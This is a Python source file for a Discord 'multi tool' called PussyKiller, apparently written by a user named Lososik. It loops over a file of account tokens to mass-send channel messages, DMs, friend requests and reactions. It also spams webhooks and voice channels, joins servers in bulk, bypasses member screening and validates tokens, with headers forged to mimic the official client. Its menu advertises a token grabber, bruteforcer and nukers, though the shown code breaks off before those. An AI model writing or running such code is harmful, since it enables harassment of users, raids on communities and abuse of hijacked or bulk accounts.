# Made by Lososik | https://github.com/Lososiik | https://dsc.gg/deadd
# You need to have tokens.txt at same folder, at tokens.txt put your own tokens. For token bruteforcer you need to create .txt file named grab.txt
# You need to write to cmd: pip install discord, pip install pyautoui, pip install requests, pip install websocket, pip install emoji, pip install json, pip intall base64, pip install colorama. Without it, the code will not work.
# © PussyKiller discord multi tool



#Copyright (c) 2021 Lososik

#Permission is hereby granted, free of charge, to any person
#obtaining a copy of this software and associated documentation
#files (the "Software"), to deal in the Software without
#restriction, including without limitation the rights to use,
#copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the
#Software is furnished to do so, subject to the following
#conditions:

#The above copyright notice and this permission notice shall be
#included in all copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
#EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
#OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
#NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
#HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
#WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
#FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
#OTHER DEALINGS IN THE SOFTWARE.

import os

try:
    import requests
except:
    os.system("pip install requests")
    import requests
from requests import get
import threading
try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama
try:
    import discord
except:
    os.system("pip install discord")
    import discord
from discord.ext import commands
try:
    import pyautogui
except:
    os.system("pip install discord")
    import pyautogui
import time
import re
try:
    import http.client
except:
    os.system('pip install python-http-client')
    import http.client

import random

try:
    import json
except:
    os.system('pip install json')
    import json
from threading import Thread
from requests import Session
try:
    import base64
except:
    os.system('pip install base64')
    import base64
import string
import sys
from colorama import Fore
try:
    import emoji as ej
except:
    os.system('pip install emoji')
    import emoji as ej
try:
    import websocket
except:
    os.system('pip install websocket')
    import websocket
from os import system
try:
    import asyncio
except:
    os.system('pip install asyncio')
    import asyncio
from bs4 import BeautifulSoup
try:
    from webdriver_manager.chrome import ChromeDriverManager
except:
    os.system('pip install selenium')
    from webdriver_manager.chrome import ChromeDriverManager
try:
    from PIL import Image
except:
    os.system('pip install pillow')
    from PIL import Image
from selenium import webdriver



ur = 'https://discord.com/api/v9/channels/messages'
title = 'PussyKiller'
system(f'title {title}')
tokens = open('tokens.txt', 'r').read().splitlines()


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text


def spammer():
    tokens = open('tokens.txt', 'r').read().splitlines()
    clear = lambda: os.system('cls')
    cl = clear()


    colorama.init()
    print('')
    print('')
    print(f'            {Fore.LIGHTMAGENTA_EX}╔═╗╔╦╗╔══╗╔══╗╔═╦╗     ╔╦╗╔══╗╔╗─╔╗─╔═╗╔═╗')
    print(f'            ║╬║║║║║══╣║══╣╚╗║║     ║╔╝╚║║╝║║─║║─║╦╝║╬║')
    print(f'            ║╔╝║║║╠══║╠══║╔╩╗║     ║╚╗╔║║╗║╚╗║╚╗║╩╗║╗╣{Fore.RESET}')
    print(f'            {Fore.WHITE}╚╝─╚═╝╚══╝╚══╝╚══╝     ╚╩╝╚══╝╚═╝╚═╝╚═╝╚╩╝{Fore.RESET}')


    print(f" {Fore.LIGHTMAGENTA_EX}                        Made by Lososik{Fore.RESET}")
    print(f'{Fore.LIGHTMAGENTA_EX}╔══════════════════╦═══════════════════════╦══════════════════════╗{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}     Raiding      {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}      TokenManager     {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}       Others {Fore.LIGHTMAGENTA_EX}        ║{Fore.RESET}            ')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Spammer       {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[8]{Fore.RESET} About/Activity     {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[15]{Fore.RESET} MassReport{Fore.RESET}{Fore.LIGHTMAGENTA_EX}       ║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} DM Spammer    {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[9]{Fore.RESET} Joiner             {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[16]{Fore.RESET} Server Nuker{Fore.RESET}{Fore.LIGHTMAGENTA_EX}     ║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Friend Spammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[10]{Fore.RESET} Leaver            {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[17]{Fore.RESET} Account Nuker{Fore.RESET}{Fore.LIGHTMAGENTA_EX}    ║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Reaction Spam {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[11]{Fore.RESET} TokenChecker      {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[18]{Fore.RESET} Token Bruteforcer{Fore.RESET}{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} WebhookSpammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[12]{Fore.RESET} Token Onliner     {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[19]{Fore.RESET} Token Grabber{Fore.RESET}{Fore.LIGHTMAGENTA_EX}    ║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[6]{Fore.RESET} Typing Spammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[13]{Fore.RESET} HypeSquad Joiner  {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[20]{Fore.RESET} About{Fore.RESET}{Fore.LIGHTMAGENTA_EX}            ║{Fore.RESET} ')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[7]{Fore.RESET} VC Spammer    {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[14]{Fore.RESET} NickName Changer  {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[21]{Fore.RESET} Exit {Fore.RESET}{Fore.LIGHTMAGENTA_EX}            ║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}╚══════════════════╩═══════════════════════╩══════════════════════╝{Fore.RESET}')
    choice = int(input('[?]>'))


    if choice == 1:
        tokens = open("tokens.txt", "r").read().splitlines()
        channel = input(f'Chanel ID: ')
        mess = input(f'Message: ')
        delay = float(input(f'Delay: '))
        ch = input('Do you want append random string: y/n?: ').lower()

        def spam(token, mess):

            if ch == 'y':
                mess += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))

            elif ch == 'n':
                pass

            else:
                pass

            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
            payload = {"content": mess, "tts": False}
            header = {"authorization": token,
                        "accept": "*/*",
                        "accept-language": "en-GB",
                        "content-length": "90",
                        "content-type": "application/json",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                    }

            while True:
                time.sleep(delay)
                src = requests.post(url, headers=header, json=payload)

                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
                            str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif src.status_code == 200:
                    print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')

                elif src.status_code == 401:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
                elif src.status_code == 404:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
                elif src.status_code == 403:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')

        def thread():
            text = mess
            for token in tokens:
                threading.Thread(target=spam, args=(token, text)).start()

        start = input(f'Press eny key to start: ')
        start = thread()


        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()





    if choice == 2:

        def DMSpammer(idd, message, token):
            header = {
                'Authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": "90",
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }

            payload = {'recipient_id': idd}
            r1 = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', headers=header,
                               json=payload)

            if chrr == 'y':
                message += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
            elif chrr == 'n':
                pass
            else:
                pass

            payload = {"content": message, "tts": False}
            j = json.loads(r1.content)

            while True:
                r2 = requests.post(f"https://discordapp.com/api/v9/channels/{j['id']}/messages",
                                   headers=header, json=payload)

                if r2.status_code == 429:
                    ratelimit = json.loads(r2.content)
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif r2.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}DM sent to {idd}!")


        tokens = open("tokens.txt", "r").read().splitlines()
        user = input(f"User ID: ")
        message = input(f"Message: ")
        chrr = input('Do you want append random string: y/n?: ').lower()


        def thread():
            for token in tokens:
                threading.Thread(target=DMSpammer, args=(user, message, token)).start()

        start = input(f'Press enter to start: ')
        start = thread()

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 3:

        def friender(token, user):
            try:
                user = user.split("#")
                headers = {
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-GB",
                    "authorization": token,
                    "content-length": "90",
                    "content-type": "application/json",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                payload = {"username": user[0], "discriminator": user[1]}
                src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers=headers,
                                    json=payload)
                if src.status_code == 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Friend request sent to {user[0]}#{user[1]}! ")
            except Exception as e:
                print(e)

        user = input(f"Username + Tag: ")
        tokens = open("tokens.txt", "r").read().splitlines()
        delay = float(input(f'Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, user)).start()


        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 4:

        def reaction(chd, iddd, start, org, token):
            headers = {'Content-Type': 'application/json',
                       'Accept': '*/*',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Accept-Language': 'en-US',
                       'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                       'DNT': '1',
                       'origin': 'https://discord.com',
                       'TE': 'Trailers',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                       'authorization': token,
                       'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                       }

            emoji = ej.emojize(org, use_aliases=True)
            if start == '':
                a = requests.put(
                    f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                    headers=headers)
                if a.status_code == 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} added! ")
                else:
                    print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")

            else:
                print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} ERROR, press only ENTER')

        tokens = open('tokens.txt', 'r').read().splitlines()
        chd = input('Channel ID: ')
        iddd = input('Message ID: ')
        emoji = input('Emoji: ')
        start = input("Press ENTER to start: ")
        for token in tokens:
            threading.Thread(target=reaction, args=(chd, iddd, start, emoji, token)).start()

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()

    if choice == 5:

        def webhkspammer():
            webhook = input("Webhook Link: ")
            message = input("Message: ")
            delay = float(input("Delay: "))

            while True:
                try:
                    time.sleep(delay)
                    _data = requests.post(webhook, json={'content': message})

                    if _data.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{message} sent")
                except:
                    print(
                        f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error, or wrong webhook: {Fore.LIGHTRED_EX}{webhook}{Fore.RESET}")
                    time.sleep(5)

        def thread():
            threading.Thread(target=webhkspammer(), args=(message)).start()

        thread()

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()

    if choice == 6:

        message = input("Message: ")
        amount = int(input("Amount of messages: "))
        delay = float(input('Delay: '))


        print(f"{Fore.LIGHTMAGENTA_EX}10 seconds to typing spam{Fore.RESET}")

        for seconds in range(10, 0, -1):
            print(seconds)
            time.sleep(1)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Spamming')

        for i in range(0, amount):
            if message != "":
                pyautogui.typewrite(message)
                pyautogui.press("enter")
            else:
                pyautogui.hotkey("ctrl", "v")
                pyautogui.press("enter")

            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET}{message} sent')
            time.sleep(delay)

        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done\n")

        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 7:
        tuk = []

        tokens = open("tokens.txt", "r").read().splitlines()

        asc = asyncio.new_event_loop()
        asyncio.set_event_loop(asc)

        for token in tokens:
            bottuk = discord.Client(status=discord.Status.offline)
            asc.create_task(bottuk.start(token, bot=False))
            tuk.append(bottuk)

        threading.Thread(target=asc.run_forever).start()

        time.sleep(1)

        vcc = int(input('VC Channel ID: '))
        while True:
            voc = []
            for i in tuk:
                channel = i.get_channel(vcc)
                voc.append(channel)
            for channel in voc:
                try:
                    asc.create_task(channel.connect())
                    print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Done')
                except:
                    pass


    if choice == 8:

        http.client._is_legal_header_name = re.compile(b'[^\\s][^:\\r\\n]*').fullmatch
        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} About Changer')
        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Activity Status Changer')
        changg = int(input('[?]>'))
        if changg == 1:

            def abouttt(token, abbb):
                try:
                    headers = {
                        ':authority': 'discord.com',
                        ':method': 'PATCH',
                        ':path': '/api/v9/users/@me',
                        ':scheme': 'https',
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US',
                        'authorization': token,
                        'content-length': '124',
                        'content-type': 'application/json',
                        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        'origin': 'https://canary.discord.com',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
                        'x-debug-options': 'bugReporterEnabled',
                        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}
                    rd = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json={'bio': abbb})
                    if rd.status_code == 200:
                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done!')
                    else:
                        print(
                            f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error...")

                except:
                    print('Error...')

            tokens = open('tokens.txt', 'r').read().splitlines()
            ab = input('About: ')
            for token in tokens:
                threading.Thread(target=abouttt, args=(token, ab)).start()

        if changg == 2:
            def activity(token, act):
                ws = websocket.WebSocket()
                actt = 'Online'
                ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                gjs = {'name': act,
                       'type': 0}
                auth = {'op': 2,
                        'd': {'token': token,
                              'properties': {'$os': sys.platform,
                                             '$browser': 'RTB',
                                             '$device': f"{sys.platform} Device"},
                              'presence': {'game': gjs,
                                           'status': actt,
                                           'since': 0,
                                           'afk': False}},
                        's': None,
                        't': None}
                ws.send(json.dumps(auth))
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Activity Status: {act}')

            tokens = open('tokens.txt', 'r').read().splitlines()
            text = input('Activity Status: ')
        for token in tokens:
            threading.Thread(target=activity, args=(token, text)).start()

        time.sleep(3)


        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 9:


        http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch


        tokens = open("tokens.txt", "r").read().splitlines()

        def join(invite, token):  # with this code help me my friend H0LLOW
            token = token.replace("\r", "")
            token = token.replace("\n", "")
            headers = {
                ":authority": "discord.com",
                ":method": "POST",
                ":path": "/api/v9/invites/" + invite,
                ":scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": token,
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }
            rrr = requests.post("https://discordapp.com/api/v9/invites/" + invite, headers=headers)
            if rrr.status_code == 204 or 200:
                print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Done')

            else:
                print('Error...')


        invite = input(f"Discord server invite: ")
        invite = invite.replace("https://discord.gg/", "")
        invite = invite.replace("discord.gg/", "")
        invite = invite.replace("https://discord.com/invite/", "")

        delay = float(input(f'Delay: '))


        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=join, args=(invite, token)).start()

        time.sleep(3)

        b = input('Do you want to bypass member screening y/n?: ')

        if b == 'y':
            headers = {
                ":authority": "discord.com",
                ":method": "POST",
                ":path": "/api/v9/invites/" + invite,
                ":scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": token,
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }

            def bps(invite_code, guild_id):
                vur = f"https://discord.com/api/v9/guilds/{guild_id}/member-verification?with_guild=false&invite_code=" + invite_code
                rr = requests.get(vur, headers=headers).json()
                data = {}
                data['version'] = rr['version']
                data['form_fields'] = rr['form_fields']
                data['form_fields'][0]['response'] = True
                fv = f"https://discord.com/api/v9/guilds/{str(guild_id)}/requests/@me"
                requests.put(fv, headers=headers, json=data)

            sID = input('Server ID: ')
            tokens = open('tokens.txt', 'r').read().splitlines()
            for token in tokens:
                threading.Thread(target=bps, args=(invite, sID)).start()

        elif b == 'n':
            pass

        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Done')

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 10:


        token = open("tokens.txt", "r").read().splitlines()

        ID = input(f'Discord Server ID: ')

        apilink = "https://discordapp.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token,
                    "content-length": "0",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="

                }
                requests.delete(apilink, headers=headers)
            print(f'{Fore.GREEN}[+]{Fore.RESET} Successfully left guild')

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()




    if choice == 11:


        def filter_tokens(unfiltered):
            tokens = []
            for line in [x.strip() for x in unfiltered.readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        if token not in tokens:
                            tokens.append(token)

            return tokens

        def checker(token):
            response = get(f'https://discordapp.com/api/v9/users/@me/library',
                            headers={'Authorization': token})
            if "You need to verify your account in order to perform this action." in str(
                    response.content) or "401: Unauthorized" in str(response.content):
                return False
            elif response.status_code == 401:
                return 'Invalid'
            else:
                return True


